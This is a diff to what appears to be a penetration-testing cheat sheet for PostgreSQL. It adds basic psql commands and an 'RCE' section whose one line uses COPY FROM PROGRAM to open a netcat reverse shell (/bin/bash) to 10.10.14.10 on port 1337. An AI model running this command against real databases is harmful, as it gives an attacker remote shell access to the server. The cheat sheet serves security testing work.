@@ -16,6 +16,16 @@ psql -h 127.0.0.1 -U user -p 5432 -d database
 #### Basic Commands
 
 ```bash
+# Show databases
+\list
+```
+
+```bash
+# Show tables in current database
+\dt
+```
+
+```bash
 # Dump data from table
 select * from table_name;
 ```
@@ -28,6 +38,13 @@ insert into table_name (username, password, role) values ('user', 'password', 'a
 ```bash
 # Exit
 \q
+```
+
+### RCE
+
+```bash
+# Only superuser
+CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash 10.10.14.10 1337 &'
 ```
 
 <br>
